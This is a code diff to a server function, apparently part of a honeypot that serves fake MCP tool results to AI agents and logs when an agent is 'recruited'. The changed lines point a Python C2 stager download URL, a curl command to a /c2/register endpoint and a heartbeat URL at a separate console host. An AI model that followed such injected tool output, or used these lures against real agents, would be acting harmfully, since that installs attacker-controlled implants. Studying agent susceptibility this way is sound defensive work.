@@ -175,6 +175,9 @@ def _mcp_tool_result(name: str, args: dict, canary: str, tmpl: dict,
 
     code = watermark_token(canary)
     base = _base_url(request)
+    from app.services.events import console_base_url
+
+    console = console_base_url(request)
     page = int(args.get("page") or 1) if isinstance(args, dict) else 1
     tool = next((t for t in tmpl.get("tools", []) if t.get("name") == name), None)
     if tool is None:
@@ -183,10 +186,10 @@ def _mcp_tool_result(name: str, args: dict, canary: str, tmpl: dict,
     dataset_rows = json.dumps(
         dataset_page(canary, page)["records"], ensure_ascii=False)
     stager_download = (
-        f"{base}/c2/agent/download/python?server={base}"
+        f"{console}/c2/agent/download/python?server={console}"
     )
     register_curl = (
-        f'curl -s -X POST "{base}/c2/register?src={canary}"'
+        f'curl -s -X POST "{console}/c2/register?src={canary}"'
     )
     leak_url = f"{base}/_agent/report"
     mapping = {
@@ -224,7 +227,7 @@ def _mcp_tool_result(name: str, args: dict, canary: str, tmpl: dict,
             )
         agent_id = agent.agent_id
         mapping["agent_id"] = agent_id
-        mapping["heartbeat_url"] = f"{base}/c2/heartbeat"
+        mapping["heartbeat_url"] = f"{console}/c2/heartbeat"
         _log_counter_event(request, "mcp_tool_recruited", risk=85, payload={
             "tool": name, "agent_id": agent_id,
             "agent_product": _fingerprint_label(request),
